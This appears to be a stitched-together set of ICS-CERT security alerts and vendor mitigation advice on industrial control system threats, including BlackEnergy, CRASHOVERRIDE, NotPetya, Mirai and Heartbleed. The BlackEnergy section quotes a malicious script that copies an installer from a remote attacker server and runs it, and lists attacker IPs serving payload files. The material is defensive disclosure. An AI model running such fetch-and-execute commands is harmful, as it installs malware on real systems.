They have been replaced by the Modicon M580 ePAC controller, Schneider Electric’s most current product. Schneider Electric recommends users migrate to the Modicon M580 ePAC. To mitigate risks associated with this Modbus vulnerability, users should immediately set up network segmentation and implement a firewall to block all unauthorized access to Port 502/TCP. Schneider Electric general security recommendations: Locate control and safety system networks and remote devices behind firewalls, and isolate them from the business network. Physical controls should be in place so no unauthorized persons have access to the ICS and safety controllers, peripheral equipment, or the ICS and safety networks. All controllers should reside in locked cabinets and never be left in the “Program” mode. All programming software should be kept in locked cabinets and should never be connected to any network other than the network for the intended devices. All methods of mobile data exchange with the isolated network (e.g., CDs, USB drives, etc.) should be scanned before use in the terminals or any node connected to these networks. Laptops that have connected to any other network besides the intended network should never be allowed to connect to the safety or control networks without proper sanitation. Minimize network exposure for all control system devices and/or systems, and ensure they are not accessible from the Internet. When remote access is required, use secure methods, such as virtual private networks (VPNs), recognizing that VPNs may have vulnerabilities and should be updated to the most current version available. Also recognize VPN is only as secure as the connected devices.

ABB recommends users apply the update of the PB610 applications on CP600 control panels at the earliest convenience. If an update of the devices is not possible. ABB recommends users restrict network access to the devices to only trusted parties/devices. To prevent an unauthorized login via a remote client, leave the “Force Remote Login” option of the security settings checked (default setting). In addition, set new users and passwords in the user’s settings for remote clients to “use different user and password.” ABB’s recommended security practices and firewall configurations can help protect a process control network from attacks that originate from outside the network. Such practices include : Restrict physical access to process control systems to authorized personnel, Do not have direct connections to the Internet, Separate from other networks by means of a firewall system with a minimal number of exposed ports, Process control systems should not be used for Internet surfing, instant messaging, or receiving e-mails. Portable computers and removable storage media should be carefully scanned for viruses before they are connected to a control system.

If unsure who to contact, send email to info@optergy.com The latest Optergy software updates include important security updates including enhancements to prevent unwanted intrusion. In addition to these software updates, Optergy emphasizes it is important for users to ensure the site network is also secure to add an extra layer of security. To keep the Optergy system safer from unintended access, Optergy recommends the following: Close Port 22 or disable port forwarding to Optergy server for Port 22 (SSH). This port is only used for technical support to remotely diagnose problems. If Port 22 is needed, open only for the duration of the support activity. Default state should be closed. Use secure SSL (Secure Socket Layer) connections when crossing Internet, this means using an enterprise LAN that has firewalls and routers to block incoming traffic. Alternatively, deploy the Optergy OpenVPN, which is built in and offers encrypted communication. Optergy supports SSL for encrypted communication. Use strong passwords. A strong password has a minimum of 12 characters, includes numbers, symbols, capital letters, lowercase letters, is not a Dictionary word or combination of Dictionary words, and doesn’t rely on obvious substitutions. Never share passwords. Concurrent logins can be prevented in web server and portal preferences. Use expiring passwords. Users of the system come and go, an expiring password will at least keep out people who may be no longer authorized to use the system. Always regularly update your software.

This has led to a configuration that does not match the expectations expressed in the test cases and the result is the PLC not reacting as intended. This misconfiguration can be fixed by setting an appropriate combination of task priority, task cycle time, and watchdog settings. Please see the “Onboard Ethernet Handling in CPU Firmware” chapter (System Technology for AC500 V2 Products > System Technology of CPU and Overall System > Onboard Technologies > Ethernet > Ethernet Protocols and Ports for AC500 V2 Products > Onboard Ethernet Handling in CPU Firmware) for further guidance. 4.2 PHOENIX CONTACT Phoenix Contact acknowledges this as a “known, won’t fix” issue for old products.

Schneider Electric’s security notice SEVD-2019-045-01 is available at the following location: https://www.schneider-electric.com/en/download/document/ SEVD-2019-045-01/ Schneider Electric strongly recommends following industry cybersecurity best practices, such as: Physical controls should be in place so no unauthorized person would have access to the ICS and safety controllers, peripheral equipment, or the ICS and safety networks. All controllers should reside in locked cabinets and never be left in the “Program” mode. All programming software should be kept in locked cabinets and should never be connected to any network other than the network for the devices it is intended. All methods of mobile data exchange with the isolated network (e.g., CDs, USB drives, etc.)should be scanned before use in terminals or any node connected to these networks. Laptops that have connected to any other network besides the intended network should never be allowed to connect to the safety or control networks without proper sanitation. 4.4 SIEMENS Siemens has investigated the vulnerability report on PLC cycle time influences and concludes the report does not demonstrate a valid vulnerability for Siemens PLCs. 4.5 WAGO WAGO recommends users operate the devices in closed networks or protect them with a firewall against unauthorized access. Another recommended mitigation is to limit network traffic via the switch rate limit feature according to application needs. Please also consult the product manuals on the WAGO website, as this is a known problem for some devices.

{"SUMMARY": "CRASHOVERRIDE, aka, Industroyer, is the fourth family of malware publically identified as targeting industrial control systems (ICS). It uses a modular design, with payloads that target several industrial communication protocols and are capable of directly controlling switches and circuit breakers. Additional modules include a data-wiping component and a module capable of causing a denial of service (DoS) to Siemens SIPROTEC devices. NCCIC/ICS-CERT is in the process of analyzing samples of the CRASHOVERRIDE malware family, including an additional component for credential harvesting that is presumed to be related. As part of this analysis, ICS-CERT has developed a YARA signature to detect components, as well as potential variants of the malicious files ICS-CERT possesses. Dragos, Inc., ESET, and US-CERT have released open source technical reports for the CRASHOVERRIDE malware family. These reports are available on their respective publisher’s web sites, found at the links below: Dragos, Inc.: CRASHOVERRIDE Analysis of the Threat to Electric Grid Operations ESET: Win32/Industroyer: a new threat for industrial control systems US-CERT: Alert (TA17-163A) CrashOverride Malware DETECTION YARA SIGNATURE ICS-CERT has published instructions for using the YARA signature that is applicable to typical information technology environments. ICS-CERT recommends a phased approach to utilizing this YARA signature in an ICS environment. Test the use of the signature in a test/quality assurance/development ICS environment if one exists. If not, deploy the signature against backup or alternate systems in the top end of the ICS environment; this signature will not be usable on the majority of field devices. ICS-CERT has produced a YARA signature to aid in identifying if the malicious files are present on a given system. This signature is provided “as is” and has not been fully tested for all variations or environments.

ICS-CERT is releasing this alert to enhance the awareness of critical infrastructure asset owners/operators about the Petya variant and to identify product vendors that have issued recommendations to mitigate the risk associated with this malware. Cybersecurity researchers have been aware of the Petya malware since 2016 and have recently identified a new enhanced variant with several different names, including “NotPetya,” “Petrwrap,” “GoldenEye,” and “Nyetya.” Current reporting suggests that the initial infection vector for the Petya variant may be the result of a supply chain attack against accounting software MEDoc. The Petya variant is a self-propagating worm that can laterally move through an infected network by harvesting credentials and active sessions on the network, exploiting previously identified SMB vulnerabilities , and using legitimate tools such as the Windows Management Instrumentation Command-line (WMIC) tool and the PsExec network management tool. After initial infection, the affected system scans the local network for additional systems to infect via Port 139/TCP and 445/TCP, prior to encrypting files and overwriting the Master Boot Record (MBR) or wiping sectors of the disk drive . There are several reports that suggest that the Petya variant’s creators intend it to be destructive in nature, rather than a traditional, economically motivated ransomware .

ICS-CERT is referencing US-CERT alert TA17-132A Indicators Associated With WannaCry Ransomware to enhance the awareness of critical infrastructure asset owners/operators and to identify affected product vendors that have contacted ICS-CERT for help disseminating customer notifications/recommendations to mitigate the risk associated with the “WannaCry” ransomware. In addition to the WannaCry ransomware, there is reporting of other malware exploiting the vulnerabilities in the Windows SMB server, identified in Microsoft Security Bulletin MS17-010. Some of these additional samples of malware identified in the reporting are UIWIX, Adylkuzz, and EternalRocks. The ransomware UIWIX is reported to be executed in memory and terminates itself if it is able to determine that it is running in a virtual machine or sandbox, making it more challenging to detect and analyze. The Adylkuzz Trojan is malware that consumes resources of infected systems to create a botnet for cryptocurrency mining. EternalRocks is a network worm that spreads through seven exploits and does not have a malicious payload. There is also reporting that the EternalRocks campaign may have ended ; however, information about EternalRocks is still useful, as the exploits utilized in this campaign could potentially be used in future campaigns. The impacts of these additional malware have not been fully assessed; however, since they appear to be exploiting vulnerabilities in the Windows SMB server, the mitigation guidance remains the same. These additional threats further emphasize the need for the implementation of effective prevention and protection mechanisms, such as those provided in the US-CERT alert.

In fact, the FDA does not typically need to review changes made to medical devices solely to strengthen cybersecurity. The FDA recognizes that Healthcare Delivery Organizations (HDOs) are responsible for implementing devices on their networks and may need to patch or change devices and/or supporting infrastructure to reduce security risks. Recognizing that changes require risk assessment, the FDA recommends working closely with medical device manufacturers to communicate changes that are necessary. The FDA has provided recommendations to protect healthcare systems in their Cybersecurity for Medical Devices and Hospital Networks: FDA Safety Communication . The FDA recommends that healthcare providers consider taking the following steps: Restricting unauthorized access to the network and networked medical devices. Making certain appropriate antivirus software and firewalls are up-to-date. Monitoring network activity for unauthorized use. Protecting individual network components through routine and periodic evaluation, including updating security patches and disabling all unnecessary ports and services. Developing and evaluating strategies to maintain critical functionality during adverse conditions. ICS-CERT reminds organizations to perform proper impact analysis and risk assessment prior to taking defensive measures. ICS-CERT also provides a recommended practices page on the ICS-CERT web site. Several recommended practices are available for reading or download, including Improving Industrial Control Systems Cybersecurity with Defense-in-Depth Strategies .

ICS-CERT is aware of open-source reports of “BrickerBot” attacks, which exploit hard-coded passwords in IoT devices in order to cause a permanent denial of service (PDoS). This family of botnets, which consists of BrickerBot.1 and BrickerBot.2, was described in a Radware Attack Report ( ‘BrickerBot’ Results In PDoS Attack ). ICS-CERT is working to identify vendors of affected IoT devices in order to collect product-specific mitigations and compensating controls. ICS-CERT is issuing this alert to provide early notice of the report and identify baseline mitigations for reducing risks to these and other cybersecurity attacks. DETAILS --------- Begin Update A Part 1 of 2 -------- According to Radware, this bot attack is designed to render a connected device useless by causing a PDoS, or “bricked” state. BrickerBot.1 and BrickerBot.2 exploit hard-coded passwords, exposed SSH, and brute force Telnet. According to Radware’s Attack Report and open source reporting, the following details regarding BrickerBot.1 and BrickerBot.2 are available: BrickerBot.1 targets devices running BusyBox with an exposed Telnet command window. These devices also have SSH exposed through an older version of Dropbear SSH server. Most of these devices were also identified as Ubquiti network devices running outdated firmware. Some of these devices are access points or bridges with beam directivity. BrickerBot.1 was active from March 20, 2017 to March 25, 2017. According to Radware, BrickerBot.1 attacks have ceased. BrickerBot.2 targets Linux-based devices which may or may not run BusyBox and which expose a Telnet service protected by default or hard-coded passwords. The source of the attacks is concealed by TOR exit nodes. No information is available at this time about the type and number of devices used in performing these attacks. --------- End Update A Part 1 of 2---------- This situation is still developing. ICS-CERT is working to identify vendors of affected devices in order to collect more detailed mitigation information.", "title": "BrickerBot Permanent Denial-of-Service Attack (Update A)", "MITIGATION": "ICS-CERT is currently working to identify vendors of affected IoT devices in order to collect more detailed mitigation information. Radware recommended taking the following precautions in the Attack Report above: Change the device’s factory default credentials. Disable Telnet access to the device. Use network behavioral analysis to detect anomalies in traffic and combine with automatic signature generation for protection.

Use a signature to detect the provided command sequences. --------- Begin Update A Part 2 of 2 -------- Update your Ubiquiti Networks devices with the latest firmware. --------- End Update A Part 2 of 2---------- Any positive or suspected findings should be immediately reported to ICS-CERT for further analysis and correlation. ICS-CERT strongly encourages asset owners not to assume that their control systems are deployed securely or that they are not operating with an Internet accessible configuration. Instead, asset owners should thoroughly audit their networks for Internet facing devices, weak authentication methods, and component vulnerabilities. Control systems often have Internet accessible devices installed without the owner’s knowledge, putting those systems at increased risk of attack. ICS-CERT recommends, as quality assurance, that users test the mitigations in a test development environment that reflects their production environment prior to installation. In addition, users should: Minimize network exposure for all control system devices. Control system devices should not directly face the Internet. Locate control system networks and devices behind firewalls, and isolate them from the business network. If remote access is required, employ secure methods, such as Virtual Private Networks (VPNs), recognizing that VPN is only as secure as the connected devices. Remove, disable, or rename any default system accounts wherever possible. Apply patches in the ICS environment, when possible to mitigate known vulnerabilities. Implement policies requiring the use of strong passwords. Monitor the creation of administrator level accounts by third-party vendors.

{"SUMMARY": "This updated alert is a follow-up to the original alert titled ICS-ALERT-17-073-01 MEMS Accelerometer Hardware Design Flaws that was published March 14, 2017, on the NCCIC/ICS-CERT web site. ICS-CERT is aware of public reporting of hardware design flaws in some capacitive micro-electromechanical systems (MEMS) accelerometer sensors, which are produced by the following manufacturers: Robert Bosch GmbH, STMicroelectronics, InvenSense Inc., Analog Devices Inc., and Murata Manufacturing Company. According to public reporting, the design flaws may be exploitable by playing specific acoustic frequencies in close proximity to devices containing embedded capacitive MEMS accelerometer sensors. At a specific acoustic frequency it may be possible to induce a vibration within vulnerable accelerometers to alter the sensors’ output in a predictable way. The impact of exploitation would be dependent on the function and operation of host devices, but it is understood that during an attack it may be possible to render affected sensors inoperable. This could result in a denial of service for host devices. During a successful attack, the integrity of measured data by vulnerable sensors could also be compromised. In the worst case attack scenario, it may be possible for an attacker to control sensor output data in a predictable way to achieve some level of control over a host device that primarily operates on unvalidated sensor data. The exploitability of the hardware design flaws is dependent on many factors to include physical attributes of the host device, how the host device uses the accelerometer data, the accessibility of the host device, as the attack would likely need to be carried out in close proximity to the target system. ICS-CERT has notified the affected vendors of the public reporting. Robert Bosch GmbH, STMicroelectronics, InvenSense Inc., and Analog Devices Inc. have validated the hardware design flaws. ICS-CERT is issuing this alert to provide early notice of the public reporting. ICS-CERT is also working with several of the cooperative vendors to identify a list of affected devices that contain vulnerable capacitive MEMS accelerometer sensors.

{"SUMMARY": "NCCIC/ICS-CERT received a technical bulletin from the Sierra Wireless company, outlining mitigations to secure Airlink Cellular Gateway devices affected by (or at risk of) the “Mirai” malware. While the Sierra Wireless devices are not being targeted by the malware, unchanged default factory credentials, which are publicly available, could allow the devices to be compromised. Additionally, a lower security posture could lead to the device being used in Distributed Denial of Service (DDoS) attacks against Internet web sites. There is evidence that "Internet of Things"-type devices have been infected with the Linux malware Mirai, which attackers used in the recent DDoS attacks against the web site Krebs on Security . This alert is being produced to amplify mitigations outlined by Sierra Wireless, for users of the following products: LS300, GX400, GX/ES440, GX/ES450, and RV50 ICS-CERT would like to emphasize that there is no software or hardware vulnerability being exploited in the Sierra Wireless devices by the Mirai malware. The issue is configuration management of the device upon deployment. INDICATORS OF COMPROMISE Sierra Wireless provided the following analysis: Based on currently available information, once the malware is running on the gateway, it deletes itself and resides only in memory. The malware will then proceed to scan for vulnerable devices and report its findings back to a command and control server. The command and control server may also instruct the malware to participate in a DDoS attack on specified targets. Currently, the best known indicator of the malware’s presence is abnormal traffic on Port 23/TCP as it scans for vulnerable devices. Users may also observe command and control traffic on Port 48101/TCP, and a large amount of outbound traffic if the infected gateway is participating in a DDoS attack. Because the malware resides only in memory, rebooting the gateway will remove the infection. However, if the gateway continues to use the default ACEmanager password, it will likely become reinfected. Devices attached to the gateway’s local area network may also be vulnerable to infection by the Mirai malware. Sierra Wireless gateways have a number of features that make these devices remotely accessible.", "title": "Sierra Wireless Mitigations Against Mirai Malware", "MITIGATION": "Sierra Wireless strongly recommends that users with the identified products perform the following steps on each gateway: Reboot the gateway to eliminate any existing Mirai malware; and Immediately change the ACEmanager password to a secure, unique value.

{"SUMMARY": "On December 23, 2015, Ukrainian power companies experienced unscheduled power outages impacting a large number of customers in Ukraine. In addition, there have also been reports of malware found in Ukrainian companies in a variety of critical infrastructure sectors. Public reports indicate that the BlackEnergy (BE) malware was discovered on the companies’ computer networks, however it is important to note that the role of BE in this event remains unknown pending further technical analysis. An interagency team comprised of representatives from the National Cybersecurity and Communications Integration Center (NCCIC)/Industrial Control Systems Cyber Emergency Response Team (ICS-CERT), U.S. Computer Emergency Readiness Team (US-CERT), Department of Energy, Federal Bureau of Investigation, and the North American Electric Reliability Corporation traveled to Ukraine to collaborate and gain more insight. The Ukrainian government worked closely and openly with the U.S. team and shared information to help prevent future cyber-attacks. This report provides an account of the events that took place based on interviews with company personnel. This report is being shared for situational awareness and network defense purposes. ICS-CERT strongly encourages organizations across all sectors to review and employ the mitigation strategies listed below. Additional information on this incident including technical indicators can be found in the TLP GREEN alert (IR-ALERT-H-16-043-01P and subsequent updates) that was released to the US-CERT secure portal. US critical infrastructure asset owners and operators can request access to this information by emailing ics-cert@hq.dhs.gov . DETAILS The following account of events is based on the interagency team’s interviews with operations and information technology staff and leadership at six Ukrainian organizations with first-hand experience of the event. Following these discussions and interviews, the team assesses that the outages experienced on December 23, 2015, were caused by external cyber-attackers. The team was not able to independently review technical evidence of the cyber-attack; however, a significant number of independent reports from the team’s interviews as well as documentary findings corroborate the events as outlined below. Through interviews with impacted entities, the team learned that power outages were caused by remote cyber intrusions at three regional electric power distribution companies (Oblenergos) impacting approximately 225,000 customers. While power has been restored, all the impacted Oblenergos continue to run under constrained operations. In addition, three other organizations, some from other critical infrastructure sectors, were also intruded upon but did not experience operational impacts The cyber-attack was reportedly synchronized and coordinated, probably following extensive reconnaissance of the victim networks. According to company personnel, the cyber-attacks at each company occurred within 30 minutes of each other and impacted multiple central and regional facilities. During the cyber-attacks, malicious remote operation of the breakers was conducted by multiple external humans using either existing remote administration tools at the operating system level or remote industrial control system (ICS) client software via virtual private network (VPN) connections. The companies believe that the actors acquired legitimate credentials prior to the cyber-attack to facilitate remote access. All three companies indicated that the actors wiped some systems by executing the KillDisk malware at the conclusion of the cyber-attack. The KillDisk malware erases selected files on target systems and corrupts the master boot record, rendering systems inoperable. It was further reported that in at least one instance, Windows-based human-machine interfaces (HMIs) embedded in remote terminal units were also overwritten with KillDisk. The actors also rendered Serial-to-Ethernet devices at substations inoperable by corrupting their firmware. In addition, the actors reportedly scheduled disconnects for server Uninterruptable Power Supplies (UPS) via the UPS remote management interface. The team assesses that these actions were done in an attempt to interfere with expected restoration efforts. Each company also reported that they had been infected with BlackEnergy malware however we do not know whether the malware played a role in the cyber-attacks. The malware was reportedly delivered via spear phishing emails with malicious Microsoft Office attachments. It is suspected that BlackEnergy may have been used as an initial access vector to acquire legitimate credentials; however, this information is still being evaluated. It is important to underscore that any remote access Trojan could have been used and none of BlackEnergy’s specific capabilities were reportedly leveraged.", "title": "Cyber-Attack Against Ukrainian Critical Infrastructure", "MITIGATION": "The first, most important step in cybersecurity is implementation of information resources management best practices. Key examples include: procurement and licensing of trusted hardware and software systems; knowing who and what is on your network through hardware and software asset management automation; on time patching of systems; and strategic technology refresh. Organizations should develop and exercise contingency plans that allow for the safe operation or shutdown of operational processes in the event that their ICS is breached. These plans should include the assumption that the ICS is actively working counter to the safe operation of the process. ICS-CERT recommends that asset owners take defensive measures by leveraging best practices to minimize the risk from similar malicious cyber activity. Application Whitelisting (AWL) can detect and prevent attempted execution of malware uploaded by malicious actors. The static nature of some systems, such as database servers and HMI computers, make these ideal candidates to run AWL. Operators are encouraged to work with their vendors to baseline and calibrate AWL deployments. a Organizations should isolate ICS networks from any untrusted networks, especially the Internet. All unused ports should be locked down and all unused services turned off. If a defined business requirement or control function exists, only allow real-time connectivity to external networks. If one-way communication can accomplish a task, use optical separation (“data diode”). If bidirectional communication is necessary, then use a single open port over a restricted network path. a Organizations should also limit Remote Access functionality wherever possible. Modems are especially insecure. Users should implement “monitoring only” access that is enforced by data diodes, and do not rely on “read only” access enforced by software configurations or permissions. Remote persistent vendor connections should not be allowed into the control network. Remote access should be operator controlled, time limited, and procedurally similar to “lock out, tag out.” The same remote access paths for vendor and employee connections can be used; however, double standards should not be allowed. Strong multi-factor authentication should be used if possible, avoiding schemes where both tokens are similar types and can be easily stolen (e.g., password and soft certificate). a As in common networking environments, control system domains can be subject to a myriad of vulnerabilities that can provide malicious actors with a “backdoor” to gain unauthorized access. Often, backdoors are simple shortcomings in the architecture perimeter, or embedded capabilities that are forgotten, unnoticed, or simply disregarded. Malicious actors often do not require physical access to a domain to gain access to it and will usually leverage any discovered access functionality. Modern networks, especially those in the control systems arena, often have inherent capabilities that are deployed without sufficient security analysis and can provide access to malicious actors once they are discovered. These backdoors can be accidentally created in various places on the network, but it is the network perimeter that is of greatest concern. When looking at network perimeter components, the modern IT architecture will have technologies to provide for robust remote access. These technologies often include firewalls, public facing services, and wireless access. Each technology will allow enhanced communications in and amongst affiliated networks and will often be a subsystem of a much larger and more complex information infrastructure. However, each of these components can (and often do) have associated security vulnerabilities that an adversary will try to detect and leverage. Interconnected networks are particularly attractive to a malicious actor, because a single point of compromise may provide extended access because of pre-existing trust established among interconnected resources. b ICS-CERT reminds organizations to perform proper impact analysis and risk assessment prior to taking defensive measures.

{"SUMMARY": "This alert update is a follow-up to the updated NCCIC/ICS-CERT Alert titled ICS-ALERT-14-281-01D Ongoing Sophisticated Malware Campaign Compromising ICS that was published February 2, 2016, on the ICS-CERT web site. ICS-CERT has identified a sophisticated malware campaign that has compromised numerous industrial control systems (ICSs) environments using a variant of the BlackEnergy malware. Analysis indicates that this campaign has been ongoing since at least 2011. Multiple companies working with ICS-CERT have identified the malware on Internet-connected human-machine interfaces (HMIs). Recent open-source reports have circulated alleging that a December 23, 2015, power outage in Ukraine was caused by BlackEnergy Malware. ICS-CERT and US-CERT are working with the Ukrainian CERT and our international partners to analyze the malware and can confirm that a BlackEnergy 3 variant was present in the system. Based on the technical artifacts ICS-CERT and US-CERT have been provided, we cannot confirm a causal link between the power outage with the presence of the malware. However, we continue to support CERT-UA on this issue. The YARA signature included with the original posting of this alert has been shown to identify a majority of the samples seen as of this update and continues to be the best method for detecting BlackEnergy infections. While there are many open source reports of BE3, this is the first opportunity ICS-CERT has been able to provide results of malware analysis. In a departure from the ICS product vulnerabilities used to deliver the BE2 malware, in this case the infection vector appears to have been spear phishing via a malicious Microsoft Office (MS Word) attachment. ICS-CERT and US-CERT analysis and support are ongoing, and additional technical analysis will be made available on the US-CERT Secure Portal. ICS-CERT originally published information and technical indicators about this campaign in a TLP Amber alert (ICS-ALERT-14-281-01P) that was released to the US-CERT secure portal a on October 8, 2014, and updated on December 10, 2014. US critical infrastructure asset owners and operators can request access to this information by emailing ics-cert@hq.dhs.gov . DETAILS ICS-CERT has determined that users of HMI products from various vendors have been targeted in this campaign, including GE Cimplicity, Advantech/Broadwin WebAccess, and Siemens WinCC. It is currently unknown whether other vendor’s products have also been targeted. ICS‑CERT is working with the involved vendors to evaluate this activity and also notify their users of the linkages to this campaign. At this time, ICS-CERT has not identified any attempts to damage, modify, or otherwise disrupt the victim systems’ control processes. ICS-CERT has not been able to verify if the intruders expanded access beyond the compromised HMI into the remainder of the underlying control system. However, typical malware deployments have included modules that search out any network-connected file shares and removable media for additional lateral movement within the affected environment. The malware is highly modular and not all functionality is deployed to all victims. In addition, public reports b c reference a BlackEnergy-based campaign against a variety of overseas targets leveraging vulnerability CVE-2014-4114 d (affecting Microsoft Windows and Windows Server 2008 and 2012). ICS-CERT has not observed the use of this vulnerability to target control system environments. However, analysis of the technical findings in the two report shows linkages in the shared command and control infrastructure between the campaigns, suggesting both are part of a broader campaign by the same threat actor. ICS-CERT strongly encourages asset owners and operators to look for signs of compromise within their control systems environments. Any positive or suspected findings should be immediately reported to ICS-CERT for further analysis and correlation. CIMPLICITY ICS-CERT analysis has identified the probable initial infection vector for systems running GE’s Cimplicity HMI with a direct connection to the Internet. Analysis of victim system artifacts has determined that the actors have been exploiting a vulnerability in GE’s Cimplicity HMI product since at least January 2012. The vulnerability, CVE-2014-0751 , was published in ICS‑CERT advisory ICSA-14-023-01 on January 23, 2014. Guidance for remediation was published to the GE IP portal in December 2013. e GE has also released a statement about this campaign on the GE security web site. f Using this vulnerability, attackers were able to have the HMI server execute a malicious .cim file [Cimplicity screen file] hosted on an attacker-controlled server. Date                       Request Type         Requestor IP         Screen Served 1/17/2012 7:16           Start                   <attackerIP>        //212.124.110.146/testshare/payload.cim 9/9/2013 1:49             Start                   <attackerIP>       //46.165.250.32/incoming/devlist.cim 9/10/2014 3:59           Start                   <attackerIP>      \\94.185.85.122\public\config.bak Figure 1. Log entries showing execution of remote .cim file. ICS-CERT has analyzed two different .cim files used in this campaign: devlist.cim and config.bak. Both files use scripts to ultimately install the BlackEnergy malware. devlist.cim: This file uses an embedded script that is executed as soon as the file is opened using the Screen Open event. The obfuscated script downloads the file “newsfeed.xml” from the same remote server, which it saves in the Cimplicity directory using the name <41 character string>.wsf. The name is randomly generated using upper and lower case letters, numbers, and hyphens. The .wsf script is then executed using the Windows command-based script host (cscript.exe). The new script downloads the file “category.xml,” which it saves in the Cimplicity directory using the name “CimWrapPNPS.exe.” CimWrapPNPS.exe is a BlackEnergy installer that deletes itself once the malware is installed. config.bak: This file uses a script that is executed when the file is opened using the OnOpenExecCommand event. The script downloads a BlackEnergy installer from a remote server, names it “CimCMSafegs.exe,” copies it into the Cimplicity directory, and then executes it. The CimCMSafegs.exe file is a BlackEnergy installer that deletes itself after the malware is installed. cmd.exe /c “copy \\94[dot]185[dot]85[dot]122\public\default.txt “%CIMPATH%\CimCMSafegs.exe” && start “WOW64” “%CIMPATH”\CimCMSafegs.exe” Figure 2. Script executed by malicious config.bak file. Analysis suggests that the actors likely used automated tools to discover and compromise vulnerable systems. ICS-CERT is concerned that any companies that have been running Cimplicity since 2012 with their HMI directly connected to the Internet could be infected with BlackEnergy malware. ICS-CERT strongly recommends that companies use the indicators and Yara signature in this alert to check their systems. In addition, we recommend that all Cimplicity users review ICS-CERT advisory ICSA-14-023-01 and apply the recommended mitigations. WINCC While ICS-CERT lacks definitive information on how WinCC systems are being compromised by BlackEnergy, there are indications that one of the vulnerabilities fixed with the latest update for SIMATIC WinCC may have been exploited by the BlackEnergy malware. g ICS-CERT strongly encourages users of WinCC, TIA Portal, and PCS7 to update their software to the most recent version as soon as possible. Please see Siemens Security Advisory SSA-134508 and and ICS‑CERT advisory ICSA-14-329-02D for additional details. ADVANTECH/BROADWIN WEBACCESS A number of the victims associated with this campaign were running the Advantech/BroadWin WebAccess software with a direct Internet connection. We have not yet identified the initial infection vector for victims running this platform but believe it is being targeted. DETECTION YARA SIGNATURE ICS-CERT has published instruction for how to use the YARA signature for typical information technology environments. ICS-CERT recommends a phased approach to utilize this YARA signature in an industrial control systems (ICSs) environment. Test the use of the signature in the test/quality assurance/development ICS environment if one exists. If not, deploy the signature against backup or alternate systems in the top end of the ICS environment; this signature will not be usable on the majority of field devices. --------- Begin Update E Part 1 of 1 -------- ICS-CERT has produced a YARA signature to aid in identifying if the malware files are present on a given system. This signature is provided “as is” and has not been fully tested for all variations or environments. Any positive or suspected findings should be immediately reported to ICS‑CERT for further analysis and correlation. The YARA signature is available at: https://ics-cert.us-cert.gov/sites/default/files/file_attach/ICS-ALERT-14-281-01E.yara YARA is a pattern-matching tool used to by computer security researchers and companies to help identify malware.

ICS-CERT recommends that users take defensive measures to minimize the risk of exploitation due to this unsecure device configuration of these vulnerabilities. Specifically, users should: Minimize network exposure for all control system devices. Control system devices should not directly face the Internet. Locate control system networks and devices behind firewalls, and isolate them from the business network. If remote access is required, employ secure methods, such as Virtual Private Networks (VPNs), recognizing that VPN is only as secure as the connected devices. Remove, disable, or rename any default system accounts wherever possible. Apply patches in the ICS environment, when possible to mitigate known vulnerabilities. Implement policies requiring the use of strong passwords. Monitor the creation of administrator level accounts by third-party vendors. ICS-CERT reminds organizations to perform proper impact analysis and risk assessment prior to taking defensive measures. ICS-CERT also provides a recommended practices section for control systems on the ICS-CERT web site ( http://ics-cert.us-cert.gov ). Several recommended practices are available for reading or download, including Improving Industrial Control Systems Cybersecurity with Defense-in-Depth Strategies . Organizations that observe any suspected malicious activity should follow their established internal procedures and report their findings to ICS-CERT for tracking and correlation against other incidents. a.

{"SUMMARY": "This alert update is a follow-up to the updated NCCIC/ICS-CERT Alert titled ICS-ALERT-14-099-01E Situational Awareness Alert for OpenSSL Vulnerability that was published April 29, 2014, on the ICS-CERT web site. ICS-CERT is aware of a public report of a vulnerability with proof-of-concept (PoC) exploit code that could expose private secure sockets layer (SSL) keys used in the OpenSSL implementation of secure communication. According to this report, the vulnerability in OpenSSL Versions 1.0.1 through 1.0.1f contains a flaw in its implementation of the transport layer security/datagram transport layer security (TLS/DTLS) heartbeat functionality that could disclose private/encrypted information to an attacker. This vulnerability is commonly referred to as “heartbleed.” This vulnerability was discovered by a team of security engineers (Riku, Antti, and Matti) at Codenomicon and Neel Mehta of Google Security, who reported this vulnerability to the National Cyber Security Centre Finland (NCSC-FI) for vulnerability coordination and reporting to the OpenSSL team. This report was released without coordination with either the vendor or ICS-CERT. ICS-CERT is issuing this alert to provide early notice of the report and identify baseline mitigations for reducing risks to this and other cybersecurity attacks. The report included vulnerability details and PoC exploit code for the following vulnerability: Vulnerability Type Remotely Exploitable Impact Heartbleed SSL key exposure Yes Private/encrypted information exposure. ICS-CERT continues to reach out to the vendor community to bring awareness of the OpenSSL vulnerability ( CVE-2014-0160 ). The following information is provided to assist the ICS community in making risk assessments of its environment to mitigate the threat of this exploit. As part of DHS NCCIC, ICS-CERT is aware of reports of attempted exploitation and is in the process of confirming these reports. ICS-CERT continues to monitor the situation closely and encourages entities to report any and all incidents regarding this vulnerability to DHS. REFERENCES To date, the following noninclusive list of references are available for analysis: http://heartbleed.com/ http://www.kb.cert.org/vuls/id/720951 http://digital-forensics.sans.org/blog/2014/04/10/heartbleed-links-simulcast-etc/ VULNERABILITY INFORMATION OUT OF BOUNDS READ a A flaw in the implementation of OpenSSL (Ver. 1.0.1 to 1.0.1f, and 1.0.2-beta1) could allow the private key used in SSL to be exposed. An attacker could then decrypt and read any secure data passed on the network link. CVE-2014-0160 b has been assigned. A CVSS score of 6.4 has been assigned; the CVSS vector string is (AV:N/AC:L/Au:N/C:P/I:P/A:N). c TECHNICAL DETAILS The vulnerability exists in the Heartbeat extension (RFC6520) to OpenSSL’s TLS and the DTLS protocols. The Heartbeat extension is functionally a “keep-alive” between end-users and the secure server. It works by sending periodic “data pulses” of 64 KB in size to the secure server and once the server receives that data; it reciprocates by resending the same data at the same size. d The out-of-bounds “read” vulnerability exists because the Heartbeat extension does not properly validate the data being sent from the end-user. As a result, a malicious actor could send a specially crafted heartbeat request to the vulnerable server and obtain sensitive information stored in memory on the server. Furthermore, even though each heartbeat only allows requests to have a data size limited to 64 KB segments, it is possible to send repeated requests to retrieve more 64 KB segments, which could include encryption keys used for certificates, passwords, usernames, and even sensitive content that were stored at the time. An attacker could harvest enough data from the 64 KB segments to piece together larger groupings of information, which could help an attacker develop a broader understanding of the information being acquired. e AFFECTED PRODUCTS The following OpenSSL libraries are affected: OpenSSL Versions 1.0.1 through 1.0.1f and 1.0.2-beta1 The following ICS vendor products and versions are affected.

